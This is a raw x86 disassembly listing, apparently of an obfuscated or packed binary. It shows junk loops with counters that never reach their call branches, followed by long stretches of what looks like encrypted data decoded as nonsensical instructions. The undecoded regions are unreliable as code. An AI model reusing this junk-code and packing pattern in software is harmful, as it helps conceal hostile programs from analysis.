  409a07:	mov    DWORD PTR [ebp-0x40],eax
  409a0a:	mov    eax,0x7510853
  409a0f:	mov    DWORD PTR ds:0x433663,0x1e
  409a19:	cmp    DWORD PTR ds:0x433663,0x0
  409a20:	je     0x409a5e
  409a26:	cmp    DWORD PTR ds:0x433663,0x20
  409a2d:	jne    0x409a46
  409a33:	push   DWORD PTR [ebp-0xc]
  409a36:	push   0x43369b
  409a3b:	push   0x4dbc
  409a40:	call   DWORD PTR ds:0x412198
  409a46:	mov    edi,DWORD PTR ds:0x433663
  409a4c:	dec    edi
  409a4d:	mov    DWORD PTR ds:0x433663,edi
  409a53:	jmp    0x409a19
  409a58:	sbb    DWORD PTR ds:0x4336f3,ebx
  409a5e:	xor    edx,eax
  409a60:	and    DWORD PTR ds:0x43365b,0x1370
  409a6a:	mov    ecx,0x32729a
  409a6f:	xor    edi,DWORD PTR ds:0x4335d3
  409a75:	add    edx,ecx
  409a77:	adc    edi,0x4100
  409a7d:	mov    DWORD PTR [ebp-0x8],edx
  409a80:	mov    DWORD PTR ds:0x4335bf,0x11
  409a8a:	cmp    DWORD PTR ds:0x4335bf,0x0
  409a91:	je     0x409aec
  409a97:	cmp    DWORD PTR ds:0x4335bf,0x6
  409a9e:	jne    0x409ab4
  409aa4:	push   0x53f1
  409aa9:	push   0x7cf0
  409aae:	call   DWORD PTR ds:0x412260
  409ab4:	cmp    DWORD PTR ds:0x4335bf,0x7
  409abb:	jne    0x409ad0
  409ac1:	xor    edi,edi
  409ac3:	add    edi,DWORD PTR ds:0x4335bf
  409ac9:	dec    edi
  409aca:	mov    DWORD PTR ds:0x4335bf,edi
  409ad0:	mov    edi,DWORD PTR ds:0x4335bf
  409ad6:	dec    edi
  409ad7:	mov    DWORD PTR ds:0x4335bf,edi
  409add:	jmp    0x409a8a
  409ae2:	add    DWORD PTR ds:0x4336ab,0x300c
  409aec:	mov    edx,DWORD PTR [ebp+0x8]
  409aef:	and    DWORD PTR ds:0x433623,0x0
  409af9:	jmp    0x409b0b
  409afe:	mov    edi,DWORD PTR ds:0x433623
  409b04:	inc    edi
  409b05:	mov    DWORD PTR ds:0x433623,edi
  409b0b:	cmp    DWORD PTR ds:0x433623,0x1c
  409b12:	jae    0x409b5e
  409b18:	cmp    DWORD PTR ds:0x433623,0x5
  409b1f:	jne    0x409b33
  409b25:	push   0x776c
  409b2a:	push   DWORD PTR [ebp-0x18]
  409b2d:	call   DWORD PTR ds:0x41219c
  409b33:	cmp    DWORD PTR ds:0x433623,0x4
  409b3a:	jne    0x409b4f
  409b40:	xor    edi,edi
  409b42:	xor    edi,DWORD PTR ds:0x433623
  409b48:	inc    edi
  409b49:	mov    DWORD PTR ds:0x433623,edi
  409b4f:	jmp    0x409afe
  409b54:	or     DWORD PTR ds:0x433697,0x2a5
  409b5e:	xor    edx,eax
  409b60:	or     edi,DWORD PTR ds:0x433617
  409b66:	add    edx,ecx
  409b68:	xor    edi,edi
  409b6a:	add    edi,DWORD PTR ds:0x4336af
  409b70:	or     edi,DWORD PTR ds:0x43361f
  409b76:	mov    DWORD PTR ds:0x4336af,edi
  409b7c:	mov    DWORD PTR [ebp+0xc],edx
  409b7f:	and    DWORD PTR ds:0x433623,0x414e
  409b89:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  409b90:	xor    edx,edx
  409b92:	xor    edx,DWORD PTR ds:0x4336f3
  409b98:	and    edx,DWORD PTR ds:0x4335d7
  409b9e:	mov    DWORD PTR ds:0x4336f3,edx
  409ba4:	mov    DWORD PTR [ebp-0x28],0xf89c853b
  409bab:	mov    DWORD PTR ds:0x43362f,0x15
  409bb5:	cmp    DWORD PTR ds:0x43362f,0x0
  409bbc:	je     0x409c5d
  409bc2:	cmp    DWORD PTR ds:0x43362f,0x2
  409bc9:	jne    0x409bde
  409bcf:	push   DWORD PTR [ebp-0x28]
  409bd2:	push   DWORD PTR [ebp-0x18]
  409bd5:	push   DWORD PTR [ebp-0x10]
  409bd8:	call   DWORD PTR ds:0x412264
  409bde:	cmp    DWORD PTR ds:0x43362f,0x3
  409be5:	jne    0x409bf8
  409beb:	mov    edi,DWORD PTR ds:0x43362f
  409bf1:	dec    edi
  409bf2:	mov    DWORD PTR ds:0x43362f,edi
  409bf8:	mov    edi,DWORD PTR ds:0x43362f
  409bfe:	dec    edi
  409bff:	mov    DWORD PTR ds:0x43362f,edi
  409c05:	jmp    0x409bb5
  409c0a:	and    DWORD PTR ds:0x433623,0x0
  409c14:	jmp    0x409c26
  409c19:	mov    edi,DWORD PTR ds:0x433623
  409c1f:	inc    edi
  409c20:	mov    DWORD PTR ds:0x433623,edi
  409c26:	cmp    DWORD PTR ds:0x433623,0x13
  409c2d:	jae    0x409c5d
  409c33:	cmp    DWORD PTR ds:0x433623,0x17
  409c3a:	jne    0x409c58
  409c40:	push   0x4337dd
  409c45:	push   0x4337e7
  409c4a:	push   DWORD PTR [ebp-0x1c]
  409c4d:	push   0x22b4
  409c52:	call   DWORD PTR ds:0x412268
  409c58:	jmp    0x409c19
  409c5d:	mov    DWORD PTR [ebp-0x2c],0xf89c853a
  409c64:	mov    DWORD PTR [ebp-0x30],0xf89c8539
  409c6b:	jmp    0x409fde
  409c70:	push   edx
  409c71:	jle    0x409c60
  409c73:	and    al,0x7d
  409c75:	jecxz  0x409cd4
  409c77:	push   0xffffffb4
  409c79:	inc    edx
  409c7a:	push   ds
  409c7b:	imul   ecx,DWORD PTR [esi-0x6a],0xee655061
  409c82:	jl     0x409d00
  409c84:	retf   0x7c79
  409c87:	jl     0x409ca8
  409c89:	mov    ah,0x3b
  409c8b:	inc    edi
  409c8c:	ret    
  409c8d:	pusha  
  409c8e:	xchg   edi,eax
  409c8f:	iret   
  409c90:	push   ds
  409c91:	cmp    ebp,DWORD PTR [esi+0x76]
  409c94:	push   ecx
  409c95:	icebp  
  409c96:	mov    al,BYTE PTR [eax+0x797c81e6]
  409c9c:	xor    al,0xa7
  409c9e:	xchg   edi,eax
  409c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca0:	adc    dh,BYTE PTR ds:0x58d9a6fd
  409ca6:	dec    ecx
  409ca7:	sbb    bh,BYTE PTR [eax+ecx*4]
  409caa:	mov    dh,0x2e
  409cac:	mov    dl,0xc2
  409cae:	jp     0x409d2f
  409cb0:	sbb    eax,0x923a2513
  409cb5:	pop    ebx
  409cb6:	out    0x61,al
  409cb8:	sub    BYTE PTR [edi+0x19dc7c33],cl
  409cbe:	xor    al,0x39
  409cc0:	repz ret 
  409cc2:	and    al,0xa1
  409cc4:	push   ss
  409cc5:	jmp    0xf341ca71
  409cca:	jo     0x409d44
  409ccc:	dec    eax
  409ccd:	mov    fs,WORD PTR [eax+0x28]
  409cd0:	mov    bl,0x13
  409cd2:	sub    edi,DWORD PTR [edi-0x22]
  409cd5:	lahf   
  409cd6:	rcr    DWORD PTR [edi],cl
  409cd8:	ror    esp,1
  409cda:	nop
  409cdb:	pop    ss
  409cdc:	adc    BYTE PTR [eax-0x51086e5a],bl
  409ce2:	pop    edx
  409ce3:	mov    BYTE PTR [edi],ch
  409ce5:	mov    ecx,0x257f8431
  409cea:	hlt    
  409ceb:	mov    al,0xf6
  409ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cee:	cdq    
  409cef:	out    0xaa,eax
  409cf1:	lahf   
  409cf2:	xor    edi,DWORD PTR [ecx+esi*4]
  409cf5:	or     DWORD PTR [ebx+0x52],esi
  409cf8:	nop
  409cf9:	dec    edi
  409cfa:	jle    0x409d6a
  409cfc:	push   esi
  409cfd:	jmp    0x409cf1
  409cff:	icebp  
  409d00:	push   esp
  409d01:	cwde   
  409d02:	inc    esi
  409d03:	pushf  
  409d04:	and    DWORD PTR [eax+0x6454095e],ecx
  409d0a:	xor    al,dl
  409d0c:	and    BYTE PTR [ebx+0x48d797e6],al
  409d12:	pushf  
  409d13:	pop    ebx
  409d14:	adc    edx,ecx
  409d16:	enter  0x6853,0xb
  409d1a:	not    bl
  409d1c:	mov    ds:0xa3a48218,eax
  409d21:	in     al,0x2
  409d23:	sbb    BYTE PTR [esp+ebp*1],ah
  409d26:	fsubr  QWORD PTR [esi+0x4a52de10]
  409d2c:	(bad)  [eax-0x13]
  409d2f:	adc    eax,0x865542a3
  409d34:	pop    esp
  409d35:	inc    ebp
  409d36:	sar    ebp,0xa0
  409d39:	int    0x3a
  409d3b:	jmp    0x310319ef
  409d40:	adc    eax,0xb3556ea0
  409d45:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d47:	pop    ebx
  409d48:	or     BYTE PTR [ecx+0x1bee4b1f],dl
  409d4e:	jge    0x409db2
  409d50:	dec    edx
  409d51:	call   0x3a49cd46
  409d56:	ret    0x358
  409d59:	es mov edi,es
  409d5c:	loope  0x409cf4
  409d5e:	test   DWORD PTR [ebp+0x6d],edi
  409d61:	jns    0x409d2e
  409d63:	mov    edi,0xdf429e26
  409d68:	mov    ds:0x9293d724,eax
  409d6d:	sub    bh,bh
  409d6f:	call   0xa0411285
  409d74:	or     dl,BYTE PTR [esi+0x2a69c652]
  409d7a:	sub    edx,DWORD PTR [eax+0x575be4da]
  409d80:	and    ebx,ebx
  409d82:	repz sub BYTE PTR [eax-0x6de67f7d],cl
  409d89:	ss xchg edx,eax
  409d8b:	jge    0x409e04
  409d8d:	lds    edi,FWORD PTR [ebx-0x77]
  409d90:	cs hlt 
  409d92:	jno    0x409d69
  409d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d95:	or     BYTE PTR [eax+0x1e],bh
  409d98:	push   ebx
  409d99:	(bad)  
  409d9a:	retf   0x50b5
  409d9d:	inc    ebx
  409d9e:	imul   ecx,DWORD PTR [esi+0x30],0x837bb8b
  409da5:	dec    ecx
  409da6:	in     al,0x7f
  409da8:	inc    edi
  409da9:	(bad)
  409dac:	es pop ecx
  409dae:	xlat   BYTE PTR ds:[ebx]
  409daf:	adc    eax,0x3512cfb
  409db4:	mov    DWORD PTR [eax+0x50],ecx
  409db7:	ds in  eax,0x6
  409dba:	mov    dl,0x63
  409dbc:	sbb    BYTE PTR [edx+eax*8+0x16],cl
  409dc0:	lods   al,BYTE PTR ds:[esi]
  409dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dc2:	mov    dl,0xbe
  409dc4:	scas   eax,DWORD PTR es:[edi]
  409dc5:	pop    edi
  409dc6:	xchg   ebx,ecx
  409dc8:	es out 0x21,al
  409dcb:	add    eax,0xeeccce3e
  409dd0:	pop    es
  409dd1:	addr16 mov ebp,0x9cd6fa00
  409dd7:	test   BYTE PTR [edx],dh
  409dd9:	mov    dl,0x1c
  409ddb:	icebp  
  409ddc:	sbb    BYTE PTR [edx-0x381b9264],bl
  409de2:	mov    al,0xf4
  409de4:	mov    DWORD PTR [ebx-0x418ce58f],0xc76d4e6b
  409dee:	xchg   ebp,eax
  409def:	cmp    eax,0xf15079a7
  409df4:	je     0x409e16
  409df6:	xchg   edx,eax
  409df7:	or     bl,0x21
  409dfa:	add    DWORD PTR [ebx-0x5a1ae60f],0xcfe8fd5
  409e04:	inc    eax
  409e05:	cld    
  409e06:	ins    DWORD PTR es:[edi],dx
  409e07:	aad    0x84
  409e09:	pop    ebp
  409e0a:	or     ecx,DWORD PTR [eax]
  409e0c:	ret    0xbcc3
  409e0f:	add    eax,0xd75a5c6f
  409e14:	js     0x409de0
  409e16:	test   eax,0xcce2701a
  409e1b:	sbb    esi,DWORD PTR [edx]
  409e1d:	pop    ebp
  409e1e:	hlt    
  409e1f:	push   0xffffffc2
  409e21:	fs xchg ebp,eax
  409e23:	cmp    eax,DWORD PTR [ecx+ebx*2]
  409e26:	loopne 0x409e5c
  409e28:	add    BYTE PTR [esi+0x47],cl
  409e2b:	dec    DWORD PTR [edi-0x113c9096]
  409e31:	adc    al,0xfd
  409e33:	int    0x65
  409e35:	popa   
  409e36:	add    al,BYTE PTR [esi-0x6e195c86]
  409e3c:	ret    
  409e3d:	fdivp  st(3),st
  409e3f:	ins    DWORD PTR es:[edi],dx
  409e40:	xchg   DWORD PTR [ecx+0x4dd12a6d],edi
  409e46:	push   ecx
  409e47:	xor    dh,dh
  409e49:	not    DWORD PTR [eax]
  409e4b:	or     esp,DWORD PTR [ebp+0x75]
  409e4e:	push   edx
  409e4f:	mov    edi,0x1ed914e7
  409e54:	ret    
  409e55:	mov    bl,0x21
  409e57:	dec    eax
  409e58:	idiv   esi
  409e5a:	ins    DWORD PTR es:[edi],dx
  409e5b:	pop    ebp
  409e5c:	rcr    BYTE PTR [edi-0x6c],1
  409e5f:	dec    edx
  409e60:	cdq    
  409e61:	pop    esi
  409e62:	cmc    
  409e63:	jno    0x409e81
  409e65:	push   ebx
  409e66:	and    ecx,DWORD PTR [edi-0x31]
  409e69:	(bad)  
  409e6a:	(bad)  
  409e6d:	or     al,BYTE PTR [ebx]
  409e6f:	dec    esp
  409e70:	jmp    0x5710:0x1a831cfa
  409e77:	shl    BYTE PTR [ebx],1
  409e79:	xor    ebx,DWORD PTR ds:0xd60d4fca
  409e7f:	sub    bl,BYTE PTR [ebp-0x797c8700]
  409e85:	(bad)  
  409e86:	dec    ebx
  409e87:	dec    edx
  409e88:	pop    eax
  409e89:	adc    bh,BYTE PTR [ebx-0x3e476377]
  409e8f:	mov    bl,0xc
  409e91:	push   edx
  409e92:	sbb    ch,dh
  409e94:	lds    esi,FWORD PTR [edx+0x2c1e7555]
  409e9a:	sbb    bl,BYTE PTR [ecx]
  409e9c:	cmp    al,0xf5
  409e9e:	pop    ss
  409e9f:	ins    DWORD PTR es:[edi],dx
  409ea0:	ret    0xdfe6
  409ea3:	loopne 0x409ea8
  409ea5:	dec    edi
  409ea6:	in     eax,dx
  409ea7:	jae    0x409e3a
  409ea9:	lods   eax,DWORD PTR ds:[esi]
  409eaa:	in     al,dx
  409eab:	and    eax,0xaba52f6b
  409eb0:	xchg   edi,eax
  409eb1:	mov    ch,0x75
  409eb3:	loope  0x409e53
  409eb5:	aaa    
  409eb6:	jecxz  0x409e80
  409eb8:	cmp    eax,0xb1c0fd8d
  409ebd:	mov    bh,0x19
  409ebf:	aaa    
  409ec0:	pop    ebx
  409ec1:	(bad)  
  409ec2:	cmc    
  409ec3:	call   0x4bcf41c6
  409ec8:	push   ecx
  409ec9:	jge    0x409e5c
  409ecb:	sub    al,0x64
  409ecd:	(bad)  
  409ece:	lahf   
  409ecf:	lahf   
  409ed0:	cmp    edx,ecx
  409ed2:	sbb    cl,bh
  409ed4:	xor    eax,0xa1c94b69
  409ed9:	dec    esp
  409eda:	lahf   
  409edb:	jmp    0x6b91:0x557518c3
  409ee2:	lods   eax,DWORD PTR ds:[esi]
  409ee3:	leave  
  409ee4:	mov    al,0x68
  409ee6:	pop    esi
  409ee7:	pop    es
  409ee8:	into   
  409ee9:	(bad)  
  409eea:	lea    edi,[edi]
  409eec:	rcl    BYTE PTR [edi],0xff
  409eef:	mov    ds:0x2a32b19e,al
  409ef4:	shl    DWORD PTR [ecx],cl
  409ef6:	inc    ebp
  409ef7:	xchg   BYTE PTR [ecx+esi*8+0x3e],dh
  409efb:	and    al,0xef
  409efd:	mov    DWORD PTR [esi+eax*1],ebp
  409f00:	and    al,BYTE PTR [ecx-0x1d]
  409f03:	js     0x409f69
  409f05:	xchg   DWORD PTR [esi-0x1ad5dfd4],esp
  409f0b:	mov    DWORD PTR [eax],eax
  409f0d:	inc    eax
  409f0e:	sbb    al,0x68
  409f10:	jmp    0xd821:0xba93d887
  409f17:	xchg   ecx,eax
  409f18:	repnz dec eax
  409f1a:	mov    eax,ds:0x491418ca
  409f1f:	pop    es
  409f20:	sar    BYTE PTR ds:0x6d7f56b2,0x22
  409f27:	xor    eax,0x3863df0e
  409f2c:	jge    0x409f5d
  409f2e:	rcl    BYTE PTR [edi],cl
  409f30:	cld    
  409f31:	adc    DWORD PTR es:[esi+0x7a],ecx
  409f35:	gs push eax
  409f37:	lea    ecx,[ebx+0x25ba268b]
  409f3d:	loope  0x409fbc
  409f3f:	xchg   edi,eax
  409f40:	push   es
  409f41:	mov    bl,0x2c
  409f43:	push   esp
  409f44:	popa   
  409f45:	or     eax,0x67263c86
  409f4a:	add    eax,0x5bf32c6e
  409f4f:	loope  0x409fa2
  409f51:	ret    0xd22a
  409f54:	sbb    al,0x92
  409f56:	xor    eax,0xa2631278
  409f5b:	pop    ebp
  409f5c:	xchg   DWORD PTR [ecx+ecx*4-0x6a],ecx
  409f60:	rol    al,1
  409f62:	xor    BYTE PTR ds:0xdd42e759,cl
  409f68:	inc    ebx
  409f69:	repz ret 
  409f6b:	mov    eax,ds:0xb58ad4f1
  409f70:	push   0x83c771c7
  409f75:	retf   
  409f76:	xor    ebx,DWORD PTR [ecx+0x3]
  409f79:	mov    ds:0xde5eea75,al
  409f7e:	mov    dh,0x94
  409f80:	and    bh,ch
  409f82:	out    dx,eax
  409f83:	xchg   ecx,eax
  409f84:	inc    ebx
  409f85:	sbb    al,0xe
  409f87:	sbb    al,0x97
  409f89:	adc    ah,dl
  409f8b:	inc    esi
  409f8c:	mov    esi,0x7c3f0be8
  409f91:	aam    0x43
  409f93:	jg     0x409fe4
  409f95:	sar    ah,1
  409f97:	mov    WORD PTR [edi],?
  409f99:	pop    esi
  409f9a:	bnd jp 0x409ffc
  409f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9e:	adc    eax,0xd0e8204
  409fa3:	sub    edi,eax
  409fa5:	pusha  
  409fa6:	(bad)  
  409fa7:	ins    BYTE PTR es:[edi],dx
  409fa8:	ror    DWORD PTR [edi+ebx*2+0x31],1
  409fac:	pop    sp
  409fae:	sub    al,0xb6
  409fb0:	adc    BYTE PTR [edx],0xbe
  409fb3:	push   eax
  409fb4:	das    
  409fb5:	inc    edi
  409fb6:	retf   0x1d58
  409fb9:	out    0xbf,eax
  409fbb:	adc    BYTE PTR [esi+0x274ff6ad],bh
  409fc1:	cmc    
  409fc2:	and    al,0x44
  409fc4:	adc    al,0x78
  409fc6:	jecxz  0x40a008
  409fc8:	jmp    0xc777:0x41dcaf3a
  409fcf:	clc    
  409fd0:	and    BYTE PTR ds:0x92502761,ah
  409fd6:	adc    ah,BYTE PTR [ebp-0x461a957e]
  409fdc:	adc    ebx,DWORD PTR [ebx]
  409fde:	mov    DWORD PTR [ebp-0x34],0xf89c8538
  409fe5:	and    DWORD PTR ds:0x4336a3,0x0
  409fef:	jmp    0x40a001
  409ff4:	mov    edx,DWORD PTR ds:0x4336a3
  409ffa:	inc    edx
  409ffb:	mov    DWORD PTR ds:0x4336a3,edx
  40a001:	cmp    DWORD PTR ds:0x4336a3,0x16
  40a008:	jae    0x40a02b
  40a00e:	cmp    DWORD PTR ds:0x4336a3,0x18
  40a015:	jne    0x40a026
  40a01b:	push   0x35b9
  40a020:	call   DWORD PTR ds:0x41226c
  40a026:	jmp    0x409ff4
  40a02b:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a032:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a039:	movzx  edx,BYTE PTR ds:0x4336f3
  40a040:	adc    edx,DWORD PTR ds:0x4336ab
  40a046:	mov    DWORD PTR ds:0x4336f3,edx
  40a04c:	mov    edx,DWORD PTR [ebp+0x8]
  40a04f:	xor    edx,eax
  40a051:	mov    edi,DWORD PTR [ebp-0x10]
  40a054:	add    edx,ecx
  40a056:	cmp    edi,edx
  40a058:	je     0x40d768
  40a05e:	mov    DWORD PTR ds:0x4335d7,0x2fff
  40a068:	push   ebx
  40a069:	jmp    0x40d743
  40a06e:	movzx  edi,BYTE PTR ds:0x43365f
  40a075:	xor    DWORD PTR ds:0x433633,edi
  40a07b:	mov    edx,DWORD PTR [ebp-0x8]
  40a07e:	mov    edi,DWORD PTR [ebp-0x10]
  40a081:	sub    DWORD PTR ds:0x4335d3,0x7416
  40a08b:	sub    edi,edx
  40a08d:	movzx  edx,WORD PTR ds:0x4336eb
  40a094:	xor    DWORD PTR ds:0x4336db,edx
  40a09a:	jmp    0x40a40d
  40a09f:	push   edi
  40a0a0:	mov    dh,0x10
  40a0a2:	sti    
  40a0a3:	std    
  40a0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a5:	push   edi
  40a0a6:	jb     0x40a085
  40a0a8:	xor    dl,BYTE PTR [ecx+0x4e]
  40a0ab:	or     eax,0x33e56e06
  40a0b0:	jmp    0x7c7c:0x79ca7c7c
  40a0b7:	stc    
  40a0b8:	push   ecx
  40a0b9:	mov    esi,0x48662f00
  40a0be:	mov    esi,0xc13c4262
  40a0c3:	mov    eax,ds:0xa2cfe558
  40a0c8:	ins    BYTE PTR es:[edi],dx
  40a0c9:	xor    esp,DWORD PTR [ebp+0x4b88db57]
  40a0cf:	enter  0xd21a,0x1d
  40a0d3:	shl    BYTE PTR ds:0x2fe84523,cl
  40a0d9:	out    dx,al
  40a0da:	lea    edx,[ecx+0x78]
  40a0dd:	jne    0x40a0ba
  40a0df:	xchg   esp,eax
  40a0e0:	dec    esi
  40a0e1:	inc    edi
  40a0e2:	hlt    
  40a0e3:	cmp    al,0xb8
  40a0e5:	repnz dec edi
  40a0e7:	mov    eax,0xde65452e
  40a0ec:	dec    ecx
  40a0ed:	pop    esi
  40a0ee:	jmp    0x40a0fd
  40a0f0:	lea    ebp,[esi+0x419eb6e9]
  40a0f6:	or     BYTE PTR [ecx-0x76],bh
  40a0f9:	pop    ss
  40a0fa:	mov    al,0xfa
  40a0fc:	dec    ebp
  40a0fd:	arpl   WORD PTR [edi],ax
  40a0ff:	cmp    eax,0xd566227c
  40a104:	in     al,dx
  40a105:	cdq    
  40a106:	loope  0x40a152
  40a108:	ds pop ds
  40a10a:	stos   BYTE PTR es:[edi],al
  40a10b:	jle    0x40a11c
  40a10d:	aas    
  40a10e:	jb     0x40a0f9
  40a110:	(bad)  [ebx]
  40a112:	push   ebp
  40a113:	imul   ebp,DWORD PTR [edx],0x5595b36e
  40a119:	nop
  40a11a:	retf   0x6b4b
  40a11d:	(bad)  
  40a11e:	shl    ch,1
  40a120:	cdq    
  40a121:	inc    esi
  40a122:	ins    BYTE PTR es:[edi],dx
  40a123:	ins    BYTE PTR es:[edi],dx
  40a124:	outs   dx,BYTE PTR ds:[esi]
  40a125:	leave  
  40a126:	pop    ebx
  40a127:	xor    al,BYTE PTR [ebp+0x160ed9c8]
  40a12d:	pop    ebx
  40a12e:	mov    edx,0x1c3cff2b
  40a133:	push   ebp
  40a134:	push   0xffffff90
  40a136:	mov    ah,0x9e
  40a138:	xchg   esp,eax
  40a139:	pusha  
  40a13a:	jmp    0x40a1b1
  40a13c:	and    BYTE PTR [edx+ebp*8-0x33],dl
  40a140:	aaa    
  40a141:	stc    
  40a142:	jmp    0x3a28:0x741b4026
  40a149:	cmp    eax,DWORD PTR ds:0x5768026e
  40a14f:	(bad)  
  40a150:	jmp    0x4300:0x66f65233
  40a157:	dec    edi
  40a158:	pop    ecx
  40a159:	add    al,0x49
  40a15b:	jmp    0x92a58775
  40a160:	leave  
  40a161:	xchg   edx,eax
  40a162:	add    eax,0x60254cc8
  40a167:	adc    eax,0xf72ddee0
  40a16c:	test   DWORD PTR [ebp+0x6a15888],esp
  40a172:	mov    edi,0x99f27ff5
  40a177:	iret   
  40a178:	xlat   BYTE PTR ds:[ebx]
  40a179:	inc    esi
  40a17a:	inc    esi
  40a17b:	add    bh,BYTE PTR [eax]
  40a17d:	add    edx,DWORD PTR [ebx-0x1d72bacc]
  40a183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a184:	mov    edi,gs
  40a186:	mov    edx,0xfa02e3f
  40a18b:	mov    al,0x86
  40a18d:	enter  0xaca3,0x86
  40a191:	sbb    al,0xd1
  40a193:	xchg   ebx,eax
  40a194:	ins    BYTE PTR es:[edi],dx
  40a195:	mov    DWORD PTR [ecx-0x7f],edx
  40a198:	add    esp,DWORD PTR [ebx+esi*1]
  40a19b:	add    al,0xcb
  40a19d:	sub    eax,0x6486700a
  40a1a2:	outs   dx,DWORD PTR ds:[esi]
  40a1a3:	or     DWORD PTR [eax+edx*2-0x66aa4263],edi
  40a1aa:	daa    
  40a1ab:	je     0x40a1da
  40a1ad:	test   BYTE PTR [eax],dh
  40a1af:	cmp    eax,0xf6df2224
  40a1b4:	xor    al,BYTE PTR [edx+0x76]
  40a1b7:	dec    ebp
  40a1b8:	dec    ebx
  40a1b9:	jne    0x40a145
  40a1bb:	xchg   edi,eax
  40a1bc:	inc    ecx
  40a1bd:	adc    ch,BYTE PTR [edx]
  40a1bf:	add    dl,BYTE PTR [ebp+0x6b]
  40a1c2:	jnp    0x40a190
  40a1c4:	mov    bl,0xe3
  40a1c6:	xor    bh,bl
  40a1c8:	cmp    BYTE PTR [esp+ecx*4-0x3f],dl
  40a1cc:	loope  0x40a20d
  40a1ce:	in     eax,0x24
  40a1d0:	lahf   
  40a1d1:	hlt    
  40a1d2:	icebp  
  40a1d3:	in     al,0xf
  40a1d5:	movhps xmm5,QWORD PTR [edx]
  40a1d8:	mov    ecx,0xa43d22c
  40a1dd:	ins    DWORD PTR es:[edi],dx
  40a1de:	adc    al,ah
  40a1e0:	mov    ch,0x70
  40a1e2:	mov    bh,0x6d
  40a1e4:	test   BYTE PTR [edi-0x53a65df8],ah
  40a1ea:	inc    esi
  40a1eb:	adc    edi,DWORD PTR [ecx]
  40a1ed:	clc    
  40a1ee:	mov    al,ds:0xd4c54b8a
  40a1f3:	dec    edi
  40a1f4:	mov    esp,0x1500925
  40a1f9:	(bad)  
  40a1fa:	loop   0x40a246
  40a1fc:	add    dl,BYTE PTR [ebx]
  40a1fe:	and    eax,0x4678042e
  40a203:	dec    edi
  40a204:	cmp    DWORD PTR [esp+edi*8],edx
  40a207:	inc    eax
  40a208:	jmp    0xcb30dae9
  40a20d:	cmc    
  40a20e:	mov    ebp,0x27085380
  40a213:	(bad)  [edx-0x79]
  40a216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a217:	pop    eax
  40a218:	inc    esi
  40a219:	ja     0x40a270
  40a21b:	call   0x5b8a:0x9ef9d4b7
  40a222:	xchg   esi,eax
  40a223:	and    al,BYTE PTR [edi-0x6c]
  40a226:	sub    al,0x46
  40a228:	jne    0x40a295
  40a22a:	fist   DWORD PTR [eax-0x635b4e5b]
  40a230:	out    dx,al
  40a231:	inc    eax
  40a232:	xor    al,0x43
  40a234:	xchg   esp,eax
  40a235:	jne    0x40a215
  40a237:	or     BYTE PTR [eax+0x7c113be6],ch
  40a23d:	frstor [esi]
  40a23f:	pop    edx
  40a240:	jge    0x40a1d9
  40a242:	test   BYTE PTR [ebp-0x6fb64d56],al
  40a248:	mov    BYTE PTR cs:[ecx+esi*8+0x31],dh
  40a24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a24e:	imul   edx,DWORD PTR [edx+0x19],0x8c2b32f5
  40a255:	push   edi
  40a256:	shl    BYTE PTR ds:0xa67b970c,cl
  40a25c:	jb     0x40a2b9
  40a25e:	dec    ebx
  40a25f:	call   0x1921:0x3eeb22eb
  40a266:	mov    edi,ebx
  40a268:	add    BYTE PTR [ecx],dh
  40a26a:	sbb    esi,DWORD PTR [ebp+0x381c1bee]
  40a270:	sub    DWORD PTR [edx+ebp*1],esp
  40a273:	loop   0x40a200
  40a275:	aaa    
  40a276:	and    eax,esi
  40a278:	sub    esi,DWORD PTR [esi]
  40a27a:	lods   eax,DWORD PTR ds:[esi]
  40a27b:	adc    ah,BYTE PTR [esi]
  40a27d:	xor    al,BYTE PTR [ebx+0x39]
  40a280:	(bad)  
  40a281:	cmp    BYTE PTR [ecx-0x44],dl
  40a284:	sub    BYTE PTR [ebx],dl
  40a286:	sub    al,0xa5
  40a288:	mov    dh,cl
  40a28a:	repnz and eax,0x5404c82a
  40a290:	int3   
  40a291:	cmp    ecx,DWORD PTR [eax]
  40a293:	ja     0x40a232
  40a295:	icebp  
  40a296:	popa   
  40a297:	loop   0x40a22e
  40a299:	mov    ebx,0x362ec9d2
  40a29e:	mov    bh,BYTE PTR gs:[ecx-0x1a]
  40a2a2:	in     al,dx
  40a2a3:	cdq    
  40a2a4:	xchg   DWORD PTR [edx],ebp
  40a2a6:	rcr    ebx,1
  40a2a8:	imul   esp,ecx,0xffffffe1
  40a2ab:	xchg   cl,cl
  40a2ad:	push   ebp
  40a2ae:	mov    ds:0x2b7f226b,al
  40a2b3:	mov    dl,0x5
  40a2b5:	xor    eax,0x4b4cf163
  40a2ba:	pop    esi
  40a2bb:	fcmovnbe st,st(4)
  40a2bd:	cmp    ch,ah
  40a2bf:	fcmove st,st(7)
  40a2c1:	or     esp,DWORD PTR [esi]
  40a2c3:	retf   0xd327
  40a2c6:	xlat   BYTE PTR ds:[ebx]
  40a2c7:	(bad)  
  40a2c8:	and    DWORD PTR [ebp+0x34],ebp
  40a2cb:	push   ds
  40a2cc:	sub    ecx,DWORD PTR [ebx-0x27a75608]
  40a2d2:	(bad)  
  40a2d3:	call   0x9bb870bb
  40a2d8:	or     BYTE PTR [ecx+esi*8+0x609ecd7e],bl
  40a2df:	test   al,0x56
  40a2e1:	not    BYTE PTR [ebp-0x6]
  40a2e4:	xchg   ecx,eax
  40a2e5:	mov    bl,0x32
  40a2e7:	ss inc ecx
  40a2e9:	imul   edx,DWORD PTR [ebx],0x7d96535
  40a2ef:	clc    
  40a2f0:	cmc    
  40a2f1:	and    eax,0x57f7f944
  40a2f6:	jae    0x40a370
  40a2f8:	test   DWORD PTR [ecx+0x61],esi
  40a2fb:	enter  0xf300,0xfd
  40a2ff:	enter  0x5a2c,0x56
  40a303:	push   es
